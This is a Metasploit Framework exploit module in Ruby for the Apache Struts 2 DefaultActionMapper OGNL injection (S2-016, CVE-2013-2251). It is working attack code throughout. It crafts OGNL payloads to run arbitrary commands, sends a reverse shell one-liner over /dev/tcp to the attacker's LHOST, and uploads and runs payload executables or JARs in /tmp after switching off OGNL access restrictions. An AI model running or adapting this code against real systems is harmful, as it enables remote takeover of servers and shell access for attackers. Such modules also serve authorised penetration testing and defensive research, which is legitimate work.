##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Remote Command Execution in Apache Struts 2.0.0 - 2.3.15 DefaultActionMapper (S2-016)',
			'Description'    => %q{
				Struts 2 before 2.3.15.1 the information following "action:", "redirect:" or
				"redirectAction:" available in Struts 2 DefaultActionMapper is not properly sanitized.
				In addition with any following information will be evaluated as OGNL expression against
				the value stack resulting in command injection.

				This module demonstrates remote command execution or vulnerable target.

				This module has been tested successfully on Stringruts 2.3.15 over Tomcat 7, with
				Red Hat Enterprise Linux 5 and Mac OS X Lion (10.7) operating systems
			},
			'Author'         =>
				[
					'Takeshi Terada', # Vulnerability discovery
					'sinn3r',       # Original metasploit module for DefaultActionMapper
					'juan vazquez', # Original metasploit module for DefaultActionMapper
					'mihi', # Original ARCH_JAVA support
					'Lersak Limwiwatkul (Joe) <lersak[@]gmail.com>' # Remote command execution support
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2013-2251' ],
					[ 'OSVDB', '95405' ],
					[ 'BID', '61189' ],
					[ 'URL', 'http://struts.apache.org/release/2.3.x/docs/s2-016.html' ]
				],
			'Platform' 	 => [ 'osx', 'linux', 'java' ],
			'Privileged'     => false,
			'Targets'        =>
				[
					[ 'Linux Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'linux',
						}
					],
					[ 'Mac OS X Universal',
						{
							'Arch' => ARCH_X86,
							'Platform' => 'osx',
						}
					],
					[ 'Java Universal',
						{
							'Arch' => ARCH_JAVA,
							'Platform' => 'java'
						}
					]
				],
			'DisclosureDate' => 'Jul 2 2013',
			'DefaultTarget' => 2))

			register_options(
				[
					Opt::LPORT(4444),
					Opt::RPORT(8080),
					OptEnum.new('HTTPMETHOD', [ true, 'HTTP Method to use, GET or POST', 'GET', ['GET','POST']]),
					OptEnum.new('OGNL_EVAL', [ true, 'OGNL expression evaluation opening bracket, % or $', '$', ['$','%']]),
					OptEnum.new('STRUTS_ACTION', [ true, 'Possible Struts 2 DefaultActionMapper: action, redirect and redirectAction', 'redirect', ['action','redirect','redirectAction']]),
					OptString.new('TARGETURI', [ true, 'The path to a struts application action i.e. /app/edit.action', ""]),
					OptString.new('CMD', [ false, 'Execute a specific command', "" ]),
					OptString.new('REVERSE_SHELL_CMD', [ false, 'Execute the pre-defined reverse bash shell command', "False" ])
				], self.class)
	end

	def to_boolean(s)
		return !!(s =~ /^(true|t|yes|y|1)$/i)
	end

	def generate_struts_payload(opts = {})
		# Initial required parameter
		proof = rand_text_alpha(6 + rand(4))
		tail = rand_text_alpha(6 + rand(4))
		struts_action = datastore['STRUTS_ACTION']
		ognl_eval = Rex::Text::uri_encode(datastore['OGNL_EVAL'])
		# Construt the payload
		case opts
			when 'check'
				payload = "?#{struts_action}:#{ognl_eval}{new%20java.lang.String('#{proof}')}=#{tail}"
				return [ payload, proof ]
			when 'java'
				payload = "?#{struts_action}:#{ognl_eval}{CMD}=#{tail}"
				return payload
			when 'cmd'
				payload = "?#{struts_action}:#{ognl_eval}{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'CMD'})).start()}=#{tail}"
				return payload
		end
	end

	def check
		# Initial request parameter
		http_method = datastore['HTTPMETHOD']
		payload, proof = generate_struts_payload('check')
		uri = normalize_uri(target_uri.path)

		# Check whether target is reachable
		res = send_request_cgi({
			'uri' => uri,
			'method' => http_method
		})
		if res.nil? or res.code != 200
			print_error("Target is not accessible (#{rhost}:#{rport}#{uri})")
			return Exploit::CheckCode::Unknown
		end

		# Check the target
		uri << payload
		res = send_request_cgi({
			'uri' => uri,
			'method' => http_method
		})

		# Request and response if verbose is enabled
		vprint_status("Request:\n#{http_method} #{uri}")
		vprint_status("Response:\n"+res.to_s)

		# Status of target
		if res and res.code == 302 and res.headers['Location'] =~ /#{proof}/
			return Exploit::CheckCode::Vulnerable
		else
			return Exploit::CheckCode::Safe
		end
	end

	def execute_command(cmd, opts = {})
		vprint_status("Attempting to execute: #{cmd}")
		cmds = cmd
		uri = String.new(datastore['TARGETURI'])
		http_method = datastore['HTTPMETHOD']

		# Append injected command
		case opts
			when 'java'
				uri << generate_struts_payload('java')
				uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))
			else
				uri << generate_struts_payload('cmd')
				cmds.gsub!(' ','\',\'')
				cmds.gsub!('@',' ')
				uri.gsub!(/CMD/, Rex::Text::uri_encode(cmd))
		end

		res = send_request_raw({
			'uri'     => uri,
			'method'  => http_method
		}, 5)

		# Request and response if verbose enabled
		vprint_status("Request:\n#{http_method} #{uri}")
		vprint_status("Response:\n"+res.to_s)

	end

	def reverse_shell_cmd_stager
		# Retrieve target machine and port
		target = datastore['LHOST'].to_s
		port = String.new(datastore['LPORT'].to_s)
		# Embedded one liner reverse shell with shell interpreter
		cmds = "/bin/sh -c /bin/sh@-i@&>@/dev/tcp/HOST/PORT@0>&1@2>&1"
		cmds.gsub!(/HOST/, target)
		cmds.gsub!(/PORT/, port)
		# Execute reverse bash shell command
		execute_command(cmds)
	end

	def java_upload_part(part, filename, append = 'false')
		cmd = ""
		cmd << "new java.io.FileOutputStream('#{filename}',#{append})"
		cmd << ".write(new sun.misc.BASE64Decoder().decodeBuffer('#{Rex::Text.encode_base64(part)}'))"
		cmd << ".close()"
		execute_command(cmd, 'java')
	end

	def unix_stager
		# Define dropper payload properties
		@payload_exe = "/tmp/" + rand_text_alphanumeric(8+rand(8))
		append = 'false'
		exe = generate_payload_exe

		# Uploading the generated payload
		chunk_length = 384 # 512 bytes when base64 encoded
		while(exe.length > chunk_length)
			java_upload_part(exe[0, chunk_length], @payload_exe, append)
			exe = exe[chunk_length, exe.length - chunk_length]
			append='true'
		end
		java_upload_part(exe, @payload_exe, append)

		# Executing payload
		execute_command("/bin/sh -c chmod@+x@#{@payload_exe}")
		execute_command("/bin/sh -c #{@payload_exe}")
	end

	def java_stager
		# Define dropper payload properties
		@payload_exe = "/tmp/" + rand_text_alphanumeric(8+rand(8)) + ".jar"
		append = 'false'
		jar = payload.encoded_jar.pack

		# Iterate dropping the generated payload
		chunk_length = 384 # 512 bytes when base64 encoded
		while(jar.length > chunk_length)
			java_upload_part(jar[0, chunk_length], @payload_exe, append)
			jar = jar[chunk_length, jar.length - chunk_length]
			append='true'
		end
		java_upload_part(jar, @payload_exe, append)

		cmd = ""
		# Enable static method accessible
		cmd << "#_memberAccess[\"allowStaticMethodAccess\"]=true,"
		# Disable Vararg handling (since it is buggy in OGNL used by Struts 2.1
		cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),"
		cmd << "#q.setAccessible(true),#q.set(null,true),"
		cmd << "#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),"
		cmd << "#q.setAccessible(true),#q.set(null,false),"
		# Create classloader
		cmd << "#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}').toURI().toURL()})"
		# Load class
		cmd << ",#c=#cl.loadClass('metasploit.Payload')"
		# Invoke main method
		cmd << ",#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke("
		cmd << "null,new java.lang.Object[]{new java.lang.String[0]})"

		# Loading java payload on target machine
		execute_command(cmd, 'java')
	end

	def on_new_session(client)
		# Traditional payload
		if client.type != "meterpreter"
			print_error("Please use a meterpreter payload in order to automatically cleanup.")
			print_error("The #{@payload_exe} file must be removed manually.")
			return
		end
		# Meterpreter payload
		client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
		print_warning("Deleting the #{@payload_exe} file")
		client.fs.file.rm(@payload_exe)
	end

	def exploit
		# Executing remote command
		if not datastore['CMD'].empty?
			print_status("Executing command")
			execute_command(datastore['CMD'])
			return
		end

		# Executing reverse bash shell command
		if target['Platform'] != "java"
			if not datastore['REVERSE_SHELL_CMD'].empty?
				if to_boolean(datastore['REVERSE_SHELL_CMD'])
					print_status("Executing reverse bash shell command")
					reverse_shell_cmd_stager
					return
				end
			end
		end

		# Executing payload on target platform
		case target['Platform']
			when 'linux'
				print_status("Executing payload on Linux platform")
				unix_stager
			when 'osx'
				print_status("Executing payload on Mac OS X platform")
				unix_stager
			when 'java'
				print_status("Executing payload on Java platform")
				java_stager
			else
				fail_with(Exploit::Failure::NoTarget, "Unsupported target platform")
		end
		handler
	end
end

